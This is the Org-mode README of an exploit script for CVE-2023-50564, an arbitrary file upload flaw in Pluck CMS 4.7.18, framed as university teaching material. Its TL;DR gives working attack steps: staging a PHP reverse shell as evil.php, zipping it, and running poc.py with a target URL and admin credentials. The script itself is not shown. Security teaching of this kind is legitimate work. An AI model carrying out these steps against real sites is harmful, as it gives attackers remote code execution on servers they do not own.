#+TITLE: Pluck CMS Exploitation Script
#+AUTHOR: acnimda

* TL:DR
1. Create a revshell:
   #+begin_src
cp /usr/share/webshells/php/php-reverse-shell.php ~/path/to/your/likings/evil.php

   #+end_src
2. zip the revshell:
   #+begin_src
zip exploit.zip evil.php
   #+end_src
3. run =poc.py=.
  #+BEGIN_SRC bash
  python3 poc.py --url=example.nl -u admin -p admin123
  #+END_SRC

* Introduction
This Python script is developed for educational purposes as part of an university lecture series on cybersecurity and ethical hacking. It provides a practical demonstration of how to automate the process of exploiting a known remote code execution vulnerability in =Pluck CMS version 4.7.18= and is an modified version of the original [[https://www.exploit-db.com/exploits/51592][exploit from exploit-db]].

* CVE-2023-50564
This script is based on =CVE-2023-50564= where an arbitrary file upload vulnerability in the component =/inc/modules_install.php= of =Pluck-CMS v4.7.18= allows attackers to execute arbitrary code via uploading an evil ZIP file.


* Dependencies
  This script requires =Python3= and the following additional modules:
  - requests: To handle HTTP requests
  - requests_toolbelt: For multipart file upload support

  You can install the required modules using pip:

  #+BEGIN_SRC shell
  pip install requests requests_toolbelt
  #+END_SRC

* Usage
  Before running the script, ensure that you have permission to test the target application.

  The script takes the following command-line arguments:
  - -u, --username : The username for the login attempt
  - -p, --password : The corresponding password
  - --url : The base URL of the target Pluck CMS instance, e.g., "hack.tb"

  To run the script, use the following command:

  #+BEGIN_SRC shell
  python3 poc.py --url=example.com -u admin -p admin123
  #+END_SRC

  Make sure to replace =example.com=, =admin=, and =admin123= with the appropriate URL and credentials for your test scenario.
